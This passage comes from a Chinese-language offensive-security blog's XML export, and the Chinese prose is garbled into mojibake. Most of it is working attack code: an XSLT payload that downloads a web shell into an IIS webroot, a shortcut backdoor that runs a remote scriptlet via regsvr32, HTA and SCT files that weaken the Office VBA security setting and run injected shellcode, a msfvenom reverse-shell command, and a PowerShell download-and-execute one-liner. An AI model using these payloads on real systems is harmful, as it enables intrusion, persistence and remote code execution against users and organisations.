Attacksé’ˆå¯¹è¿™ç§æ–¹å¼ï¼Œå·²ç»æœ‰æ–‡ç« æ€»ç»“äº†ï¼Œè¿™é‡Œå°±ä¸å¤šåšä»‹ç»äº†ï¼Œè¯¦ç»†è¯·çœ‹è¿™é‡Œã€‚ 0x05 å°ç»“æœ¬æ–‡å°±é€šè¿‡SQL Server æ‰§è¡Œç³»ç»Ÿå‘½ä»¤è¿›è¡Œäº†ä¸€ä¸‹å°ç»“ï¼Œå½“ç„¶æ–¹å¼å¯èƒ½ä¸å…¨ï¼Œä»…ä»…æ˜¯è‡ªå·±çŸ¥é“çš„ä¸€äº›æ–¹æ³•ï¼Œè¿˜å¸Œæœ›å¤§ç‰›åˆ«å–·ï¼Œå¦‚æœæ‚¨æœ‰ä»€ä¹ˆæ›´åŠ æ–°é¢–çš„æ–¹æ³•ï¼Œæ¬¢è¿è¡¥å……ï¼Œå¸Œæœ›æœ¬æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚ 0x06 å‚è€ƒ1.http://bobao.360.cn/learning/detail/3070.html2.https://www.mssqltips.com/sqlservertip/2087/how-to-execute-a-dos-command-when-xpcmdshell-is-disabled-in-sql-server/3.http://blog.csdn.net/tjvictor/article/details/47269334.https://www.mssqltips.com/sqlservertip/1662/writing-to-an-operating-system-file-using-the-sql-server-sqlclr/5.https://www.t00ls.net/viewthread.php?tid=23198&amp;extra=page%3D1%26amp%3Bfilter%3Dtype%26amp%3Btypeid%3D39]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>mssql</tag>
        <tag>exec command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE with XSL]]></title>
    <url>%2Farchives%2Fxxe_with_xsl.html</url>
    <content type="text"><![CDATA[å½“XXEæ”¯æŒXSLæ—¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼šå†™shell123456789101112131415161718192021&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt;&lt;msxsl:script language="C#" implements-prefix="user"&gt;&lt;![CDATA[public string xml()&#123; System.Net.WebClient webClient = new System.Net.WebClient(); webClient.DownloadFile("https://x.x.x.x/shell.txt", @"c:\inetpub\wwwroot\shell.aspx"); return "Exploit Success";&#125;]]&gt;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt;&lt;xsl:value-of select="user:xml()"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Shortcut Backdoor]]></title>
    <url>%2Farchives%2FShortcut_Backdoor.html</url>
    <content type="text"><![CDATA[PS code:12345678$file = Get-Content "C:\Users\evi1cg\Desktop\backdoor\link\test.txt"$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut("C:\Users\evi1cg\Desktop\backdoor\link\è®¡ç®—æœº.lnk")$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"$Shortcut.WindowStyle = 7$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,15"$Shortcut.Arguments = ' '+ $file$Shortcut.Save() test.txt:1/c explorer.exe /e,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125; | regsvr32.exe /u /s /i:https://evi1cg.github.io/scripts/calc.png scrobj.dll DEMO: å†™äº†ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„è„šæœ¬ï¼Œåœ°å€å¦‚ä¸‹ï¼š https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329 DEMOï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Office Shellcode Execution]]></title>
    <url>%2Farchives%2FOffice_Shellcode_Execution.html</url>
    <content type="text"><![CDATA[From: https://gist.github.com/subTee/e126c6ee847a4d9fcfd7CalcExcel.hta1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objExcel = new ActiveXObject("Excel.Application"); objExcel.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objExcel.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objWorkbook = objExcel.Workbooks.Add(); var xlmodule = objWorkbook.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' xlmodule.CodeModule.AddFromString(strCode); objExcel.Run("ExecShell"); objExcel.DisplayAlerts = false; objWorkbook.Close(false); close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; CalcPPT.hta 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objPPT = new ActiveXObject("PowerPoint.Application"); objPPT.Visible = true; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objPPT.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\PowerPoint\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objPreso = objPPT.Presentations.Add(); var pptmodule = objPreso.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Public Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' pptmodule.CodeModule.AddFromString(strCode); objPPT.Run("ExecShell"); objPPT.DisplayAlerts = false; objPPT.Quit(); close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; CalcWord.hta1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objWord = new ActiveXObject("Word.Application"); objWord.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objWord.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Word\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objDoc = objWord.Documents.Add(); var wdmodule = objDoc.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' wdmodule.CodeModule.AddFromString(strCode); objWord.Run("ExecShell"); objWord.DisplayAlerts = false; objDoc.Close(false); //close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; calc.sct12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="CalcShellcode" classid="&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;!-- Orginal Shellcode Example : https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/ --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var objExcel = new ActiveXObject("Excel.Application"); objExcel.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objExcel.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objWorkbook = objExcel.Workbooks.Add(); var xlmodule = objWorkbook.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' xlmodule.CodeModule.AddFromString(strCode); objExcel.Run("ExecShell"); objExcel.DisplayAlerts = false; objWorkbook.Close(false); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; ä¿®æ”¹payloadæ–¹æ³•ï¼š1msfvenom --payload windows/meterpreter/reverse_http LHOST=192.168.56.103 LPORT=8080 --format vba &gt; msf.txt é€‰æ‹©è¦ç”¨çš„å‡ è¡Œï¼Œç®€å•å¤„ç†ä¸€ä¸‹ï¼š12345f = open('msf.txt')o = open('out.txt', 'w+')for line in f: o.write("strCode += '") o.write(line.strip("\n")+"\\n'\n")]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack With XSLT]]></title>
    <url>%2Farchives%2FHack_With_XSLT.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹XSLTå…¨ç§°ä¸ºæ‹“å±•æ ·å¼è¡¨è½¬æ¢è¯­è¨€ï¼Œæ˜¯ä¸€ç§ç”¨äºå°† XML æ–‡æ¡£è½¬æ¢ä¸º XHTML æ–‡æ¡£æˆ–å…¶ä»– XML æ–‡æ¡£çš„è¯­è¨€ã€‚æ›´å¤šå…³äºXSLTçš„æ•™ç¨‹å¯ä»¥å‚è€ƒW3schoolã€‚å…³äºXSLTçš„hackæŠ€å·§ä¹‹å‰å·²ç»æœ‰è€å¸ˆæ€»ç»“äº†WebShellç³»åˆ—(ä¸€)â€”XMLï¼Œé‡Œé¢è¯¦ç»†ä»‹ç»äº†æ€ä¹ˆé€šè¿‡xsltæ„é€ webshellï¼Œå¹¶ä¸”å¯ä»¥çœ‹çš„å‡ºï¼Œé€šè¿‡XSLTå¯ä»¥æ‰§è¡Œå¾ˆå¤šç±»å‹çš„è„šæœ¬ï¼Œå‰æ®µæ—¶é—´@Casey Smithå…¬å¼€äº†ä¸€ä¸ªExecute C# From XSLT çš„POCï¼Œæ„Ÿè§‰å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥ç®€å•çš„ç ”ç©¶äº†ä¸€ä¸‹ï¼Œä¹Ÿå°±æœ‰äº†æ­¤æ–‡ã€‚ 0x01 POCCasey Smithåˆ†äº«çš„pocå¦‚ä¸‹ï¼šcalc.xslt12345678910111213141516171819&lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="urn:MyModule"&gt; &lt;msxsl:script implements-prefix="my" language="C#"&gt; public void Exec() &#123; System.Diagnostics.Process.Start("Calc.exe"); &#125; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="my:Exec()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; å…¶ä¸­xsl:stylesheetç”¨æ¥å®šä¹‰æ ·å¼è¡¨çš„æ ¹å…ƒç´ ï¼›versionæ˜¯å…¶å¿…é¡»çš„å±æ€§ï¼Œç”¨æ¥è§„å®šæ ·å¼è¡¨çš„XSLT ç‰ˆæœ¬ï¼›xmlns:xslåç§°ç©ºé—´ï¼Œå€¼å›ºå®šï¼›è¦ä½¿ç”¨msxsl:scriptå…ƒç´ ï¼Œç”±äºå…¶å±äºå‘½åç©ºé—´urn:schemas-microsoft-com:xsltï¼Œæ‰€ä»¥æ ·å¼è¡¨å¿…é¡»åŒ…å«å‘½åç©ºé—´å£°æ˜ï¼›xmlns:myå®šä¹‰å‘½åç©ºé—´ï¼Œåå­—éšæ„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸‹é¢çš„implements-prefixçš„å€¼è¦ä¸å…¶ä¸€è‡´ã€‚ msxsl:scriptå®šä¹‰å¦‚ä¸‹ï¼š1&lt;msxsl:script language = "language-name" implements-prefix = "prefix of user namespace"&gt; &lt;/msxsl:script&gt; å…¶ä¸­ msxsl æ˜¯ç»‘å®šåˆ°å‘½åç©ºé—´ urn:schemas-microsoft-com:xslt çš„å‰ç¼€ã€‚language å±æ€§ä¸æ˜¯å¼ºåˆ¶å±æ€§ï¼Œä½†å¦‚æœæŒ‡å®šè¯¥å±æ€§ï¼Œå…¶å€¼å¿…é¡»æ˜¯ä¸‹åˆ—å€¼ä¹‹ä¸€ï¼šC#ã€VBã€JScriptã€JavaScriptã€VisualBasic æˆ– CSharpã€‚ å¦‚æœæœªæŒ‡å®šï¼Œåˆ™é»˜è®¤è¯­è¨€ä¸º JScriptã€‚implements-prefixå±æ€§æ˜¯å¿…é€‰é¡¹ã€‚ æ­¤å±æ€§ç”¨äºå£°æ˜å‘½åç©ºé—´å¹¶å°†å…¶ä¸è„šæœ¬å—å…³è”ã€‚ xsl:templateå…ƒç´ åŒ…å«äº†å½“åŒ¹é…æŒ‡å®šèŠ‚ç‚¹æ—¶è¦åº”ç”¨çš„è§„åˆ™,match å±æ€§ç”¨äºæŠŠæ¨¡æ¿å…³è”åˆ°æŸä¸ª XML å…ƒç´ ,åœ¨è¿™é‡Œå…³è”äº†example.xml,å¦‚ä¸‹ï¼š1&lt;?xml version="1.0"?&gt;&lt;data&gt;&lt;/data&gt; xsl:value-of å…ƒç´ ç”¨äºæå–æŸä¸ªé€‰å®šèŠ‚ç‚¹çš„å€¼ã€‚åœ¨è¿™é‡Œä¹Ÿå°±æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‡½æ•°ã€‚ æ‰§è¡Œå…¶POCï¼Œå¯ä»¥æˆåŠŸæ‰§è¡ŒC#ä»£ç ã€‚ 0x02 ä¼˜åŒ–ä¸ºäº†æ›´æ–¹ä¾¿ä½¿ç”¨ï¼Œå°†powershellä»£ç ä¿®æ”¹æˆå¯è¿œç¨‹åŠ è½½çš„ä»£ç ï¼Œåœ°å€ä¸ºï¼šxslt_exec.ps1 ä½¿ç”¨æ­¤è„šæœ¬å¯åŠ è½½è¿œç¨‹åŠæœ¬åœ°XSLæ–‡ä»¶å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œä»¥ä¸‹ä¸ºDEMO: å¦‚æœæƒ³è¿œç¨‹åŠ è½½æ‰§è¡Œå¯ä»¥è¿™æ ·ï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/xslt_poc/master/xslt_exec.ps1'); xslt_exec -xslt_url https://raw.githubusercontent.com/Ridter/xslt_poc/master/calc.xslt" 0x03 Exec Shellcodeæ—¢ç„¶èƒ½æ‰§è¡ŒC#ï¼Œé‚£æ€ä¹ˆæ‰§è¡ŒShellCodeå‘¢ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå‚è€ƒCasey Smithç»™å‡ºçš„ä»£ç ,ä¿®æ”¹ä»£ç å¦‚ä¸‹:shellcode.xslt1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:shellcode="urn:MyModule"&gt; &lt;msxsl:script implements-prefix="shellcode" language="C#"&gt; &lt;msxsl:using namespace="System.Runtime.InteropServices" /&gt; &lt;![CDATA[ private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport("kernel32")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); public void Exec() &#123; #msfvenom --payload windows/x64/exec CMD="calc" EXITFUNC=thread -f csharp byte[] shellcode = new new byte[272] &#123;0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,